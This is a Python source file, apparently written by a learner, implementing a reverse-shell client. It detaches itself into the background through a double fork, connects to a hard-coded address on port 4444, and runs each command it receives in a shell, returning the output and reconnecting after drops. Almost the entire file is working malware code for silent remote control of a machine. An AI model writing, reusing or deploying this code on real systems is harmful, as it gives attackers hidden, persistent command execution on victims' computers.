import socket
import time
import subprocess
import sys
import os

IP = "192.168.0.103"
PORT = 4444


def daemonize():
    # i dont fully understand this function like how it works but i do understand the use,
    # which is making the client connection a background process so that it can be silent
    # by forking it into the system processes

    try:
        pid = os.fork()
        if pid > 0:
            # parent process exits
            sys.exit(0)
    except OSError as e:
        print(f"[!] Fork failed to background: {e}")
        sys.exit(1)

    # child process
    os.setsid()  # create a new session
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        print(f"[!] Second fork failed to background: {e}")
        sys.exit(1)


def connect_to_server():
    global IP, PORT

    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((IP, PORT))
            print("[*] Connected to web server")

            while True:
                # recieve command from the server
                command = client.recv(4096).decode("utf-8", errors="ignore")
                if not command:
                    break
                try:
                    # Execute the command and capture output
                    result = subprocess.run(
                        command, shell=True, capture_output=True, text=True
                    )
                    output = result.stdout + result.stderr
                except Exception as e:
                    output = f"Error: {str(e)}"

                # send output back to server
                client.send(output.encode("utf-8"))

        except Exception as e:
            print(f"[!] Connection error: {e}")
            time.sleep(5)  # to retry after 5 seconds
        finally:
            client.close()


if __name__ == "__main__":
    daemonize()
    connect_to_server()
